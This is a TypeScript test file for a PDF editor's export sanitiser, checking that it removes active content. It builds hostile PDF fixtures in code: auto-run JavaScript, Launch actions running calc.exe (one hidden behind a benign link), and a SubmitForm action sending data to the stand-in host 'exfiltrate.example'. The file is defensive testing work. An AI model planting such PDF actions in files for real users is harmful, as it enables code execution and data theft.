import { describe, it, expect, beforeAll } from 'vitest'
import { readFileSync } from 'node:fs'
import * as mupdf from 'mupdf'
import { replay } from '../../src/write/index.js'
import { EDIT_DOCUMENT_VERSION, type EditDocument } from '../../src/write/types.js'
import { generateFixtures, fixturePath } from '../fixtures/index.js'

beforeAll(async () => { await generateFixtures() }, 60_000)
const SRC = 'src-0'
const clean = (): Uint8Array => new Uint8Array(readFileSync(fixturePath('simple-text')))

/**
 * A PDF carrying every vector this strips.
 *
 * Built here rather than committed: a genuinely malicious PDF sitting in
 * the repository is a hazard to whoever clones it, and building it makes
 * the vectors legible instead of opaque bytes.
 */
function hostile(): Uint8Array {
  const doc = mupdf.PDFDocument.openDocument(clean(), 'application/pdf') as mupdf.PDFDocument
  const root = doc.getTrailer().get('Root')

  const js = (code: string) => {
    const action = doc.newDictionary()
    action.put('S', doc.newName('JavaScript'))
    action.put('JS', doc.newString(code))
    return doc.addObject(action)
  }

  root.put('OpenAction', js('app.alert("on-open")'))

  const names = doc.newArray()
  names.push(doc.newString('evil'))
  names.push(js('this.exportDataObject()'))
  const tree = doc.newDictionary()
  tree.put('Names', names)
  const nameDict = doc.newDictionary()
  nameDict.put('JavaScript', doc.addObject(tree))
  root.put('Names', doc.addObject(nameDict))

  const catalogAA = doc.newDictionary()
  catalogAA.put('WC', js('app.alert("on-close")'))
  root.put('AA', doc.addObject(catalogAA))

  const page = doc.loadPage(0)
  const pageAA = doc.newDictionary()
  pageAA.put('O', js('app.alert("on-page-open")'))
  page.getObject().put('AA', doc.addObject(pageAA))
  page.destroy()

  const out = doc.saveToBuffer('compress,garbage=compact').asUint8Array()
  doc.destroy()
  return out
}

function inspect(bytes: Uint8Array) {
  const d = mupdf.PDFDocument.openDocument(bytes, 'application/pdf') as mupdf.PDFDocument
  const root = d.getTrailer().get('Root')
  const page = d.loadPage(0)
  try {
    return {
      openAction: !root.get('OpenAction').isNull(),
      documentJavaScript: !root.get('Names', 'JavaScript').isNull(),
      catalogActions: !root.get('AA').isNull(),
      pageActions: !page.getObject().get('AA').isNull(),
      rawScript: Buffer.from(bytes).includes('app.alert'),
    }
  } finally {
    page.destroy()
    d.destroy()
  }
}

/** An edit document that forces the full write path rather than pass-through. */
function edited(): EditDocument {
  return {
    version: EDIT_DOCUMENT_VERSION,
    sources: { [SRC]: { hash: '', name: 'a.pdf' } },
    pageOrder: ['p0'],
    pages: { p0: { sourceId: SRC, sourceIndex: 0, rotation: 90, cropBox: null } },
    objects: {},
    nextZ: 1,
  }
}

/** The same document with nothing changed, so the pass-through tier applies. */
function untouched(): EditDocument {
  return {
    ...edited(),
    pages: { p0: { sourceId: SRC, sourceIndex: 0, rotation: 0, cropBox: null } },
  }
}

describe('active-content stripping', () => {
  // Without this, every assertion below could pass against a clean file.
  it('the hostile fixture really is hostile', () => {
    expect(inspect(hostile())).toMatchObject({
      openAction: true,
      documentJavaScript: true,
      catalogActions: true,
      pageActions: true,
      rawScript: true,
    })
  })

  it('removes every vector on export', () => {
    const out = replay(new Map([[SRC, hostile()]]), edited())
    expect(inspect(out)).toMatchObject({
      openAction: false,
      documentJavaScript: false,
      catalogActions: false,
      pageActions: false,
    })
  })

  // Deleting a key only unlinks the object. If the export did not collect
  // the orphan, the script text would still sit in the file for anyone
  // reading the bytes.
  it('removes the script TEXT, not just the reference', () => {
    const out = replay(new Map([[SRC, hostile()]]), edited())
    expect(Buffer.from(out).includes('app.alert')).toBe(false)
    expect(Buffer.from(out).includes('exportDataObject')).toBe(false)
  })

  it('reports what it found', () => {
    let found: unknown
    replay(new Map([[SRC, hostile()]]), edited(), { onStripped: (f) => { found = f } })
    expect(found).toEqual({
      openAction: true,
      documentJavaScript: true,
      catalogActions: true,
      pageActions: 1,
      annotationActions: 0,
    })
  })

  it('reports nothing for a clean document', () => {
    let found: unknown
    replay(new Map([[SRC, clean()]]), edited(), { onStripped: (f) => { found = f } })
    expect(found).toEqual({
      openAction: false,
      documentJavaScript: false,
      catalogActions: false,
      pageActions: 0,
      annotationActions: 0,
    })
  })

  it('leaves the page content intact', () => {
    const out = replay(new Map([[SRC, hostile()]]), edited())
    const d = mupdf.PDFDocument.openDocument(out, 'application/pdf') as mupdf.PDFDocument
    const p = d.loadPage(0)
    try {
      expect(p.toStructuredText('').asJSON()).toContain('Hello margin')
    } finally {
      p.destroy()
      d.destroy()
    }
  })

  // The pass-through tier returns the user's original bytes untouched, so a
  // hostile file downloaded WITHOUT any edit would still carry its scripts.
  // Stripping has to defeat the pass-through.
  it('strips even when nothing else was edited', () => {
    const out = replay(new Map([[SRC, hostile()]]), untouched())
    expect(Buffer.from(out).includes('app.alert')).toBe(false)
  })

  // ...but a CLEAN document with no edits must still come back byte-identical,
  // which is what e2e/download.spec.ts asserts.
  it('still passes a clean, unedited document through untouched', () => {
    const original = clean()
    const out = replay(new Map([[SRC, original]]), untouched())
    expect(Array.from(out)).toEqual(Array.from(original))
  })

  it('works on a document with no catalog extras at all', () => {
    expect(() => replay(new Map([[SRC, clean()]]), edited())).not.toThrow()
  })
})

/**
 * A page whose annotations carry the payload -- and one ordinary link that
 * must survive.
 *
 * Separate from `hostile()` on purpose. The catalog vectors it carries
 * would defeat the pass-through tier by themselves, which would hide
 * whether the annotation sweep did any work; this fixture's ONLY payload
 * is on annotations, so the pass-through assertion below means something.
 */
function hostileAnnots(): Uint8Array {
  const doc = mupdf.PDFDocument.openDocument(clean(), 'application/pdf') as mupdf.PDFDocument
  const page = doc.loadPage(0)

  const action = (put: (d: mupdf.PDFObject) => void): mupdf.PDFObject => {
    const a = doc.newDictionary()
    put(a)
    return doc.addObject(a)
  }
  const link = (a: mupdf.PDFObject): mupdf.PDFObject => {
    const annot = doc.newDictionary()
    annot.put('Type', doc.newName('Annot'))
    annot.put('Subtype', doc.newName('Link'))
    const rect = doc.newArray()
    for (const n of [50, 50, 150, 90]) rect.push(n)
    annot.put('Rect', rect)
    annot.put('A', a)
    return doc.addObject(annot)
  }

  const annots = doc.newArray()
  annots.push(link(action((a) => {
    a.put('S', doc.newName('Launch'))
    a.put('F', doc.newString('calc.exe'))
  })))
  annots.push(link(action((a) => {
    a.put('S', doc.newName('SubmitForm'))
    a.put('F', doc.newString('https://exfiltrate.example/collect'))
  })))
  // Benign, and the whole reason this is a denylist: it must come back out.
  annots.push(link(action((a) => {
    a.put('S', doc.newName('URI'))
    a.put('URI', doc.newString('https://keep-me.example/'))
  })))
  // Benign first hop, forbidden second -- judging by /S alone passes this.
  annots.push(link(action((a) => {
    a.put('S', doc.newName('URI'))
    a.put('URI', doc.newString('https://decoy.example/'))
    a.put('Next', action((n) => {
      n.put('S', doc.newName('Launch'))
      n.put('F', doc.newString('chained.exe'))
    }))
  })))
  // A form widget with a keystroke script: not an editable annotation, so
  // it is only reachable by reading /Annots directly.
  const widget = doc.newDictionary()
  widget.put('Type', doc.newName('Annot'))
  widget.put('Subtype', doc.newName('Widget'))
  const wrect = doc.newArray()
  for (const n of [50, 120, 150, 160]) wrect.push(n)
  widget.put('Rect', wrect)
  widget.put('AA', action((aa) => aa.put('K', action((k) => {
    k.put('S', doc.newName('JavaScript'))
    k.put('JS', doc.newString('app.alert("keystroke")'))
  }))))
  annots.push(doc.addObject(widget))

  page.getObject().put('Annots', annots)
  page.destroy()
  const out = doc.saveToBuffer('compress,garbage=compact').asUint8Array()
  doc.destroy()
  return out
}

/** The /S names still present on page 0's annotation actions. */
function annotActionKinds(bytes: Uint8Array): string[] {
  const d = mupdf.PDFDocument.openDocument(bytes, 'application/pdf') as mupdf.PDFDocument
  const page = d.loadPage(0)
  const kinds: string[] = []
  try {
    const annots = page.getObject().get('Annots')
    annots.forEach((annot) => {
      const a = annot.get('A')
      if (a.isDictionary()) kinds.push(a.get('S').asName())
      if (!annot.get('AA').isNull()) kinds.push('AA')
    })
  } finally {
    page.destroy()
    d.destroy()
  }
  return kinds
}

describe('annotation-level actions', () => {
  it('the fixture really carries them', () => {
    expect(annotActionKinds(hostileAnnots()).sort()).toEqual(
      ['AA', 'Launch', 'SubmitForm', 'URI', 'URI'].sort(),
    )
  })

  it('removes Launch, SubmitForm, and widget keystroke scripts', () => {
    const out = replay(new Map([[SRC, hostileAnnots()]]), edited())
    const kinds = annotActionKinds(out)
    expect(kinds).not.toContain('Launch')
    expect(kinds).not.toContain('SubmitForm')
    expect(kinds).not.toContain('AA')
  })

  it('keeps an ordinary URI link', () => {
    const out = replay(new Map([[SRC, hostileAnnots()]]), edited())
    expect(annotActionKinds(out)).toContain('URI')
    expect(Buffer.from(out).includes('keep-me.example')).toBe(true)
  })

  // The reason chainIsForbidden walks /Next at all.
  it('removes a forbidden action hidden behind a benign one', () => {
    const out = replay(new Map([[SRC, hostileAnnots()]]), edited())
    expect(Buffer.from(out).includes('chained.exe')).toBe(false)
    expect(Buffer.from(out).includes('decoy.example')).toBe(false)
  })

  it('removes the payload text, not just the reference', () => {
    const out = replay(new Map([[SRC, hostileAnnots()]]), edited())
    for (const needle of ['calc.exe', 'exfiltrate.example', 'keystroke']) {
      expect(Buffer.from(out).includes(needle)).toBe(false)
    }
  })

  it('counts each changed annotation once, however many keys it lost', () => {
    let found: { annotationActions: number } | undefined
    replay(new Map([[SRC, hostileAnnots()]]), edited(), {
      onStripped: (f) => { found = f },
    })
    // Launch, SubmitForm, the chained link, and the widget: four of the
    // five annotations changed, and the URI link is the one left alone.
    expect(found?.annotationActions).toBe(4)
  })

  /**
   * THE POINT OF THE WHOLE TASK. Before the annotation sweep existed, this
   * file reported "nothing stripped" and therefore qualified for the
   * byte-identical pass-through tier -- the export handed the user's
   * hostile file straight back, unchanged and unmentioned.
   */
  it('defeats pass-through for a file whose only payload is on annotations', () => {
    const input = hostileAnnots()
    const out = replay(new Map([[SRC, input]]), untouched())
    expect(Buffer.from(out).equals(Buffer.from(input))).toBe(false)
    expect(Buffer.from(out).includes('calc.exe')).toBe(false)
  })

  it('still hands back a clean file byte for byte', () => {
    const input = clean()
    const out = replay(new Map([[SRC, input]]), untouched())
    expect(Buffer.from(out).equals(Buffer.from(input))).toBe(true)
  })
})
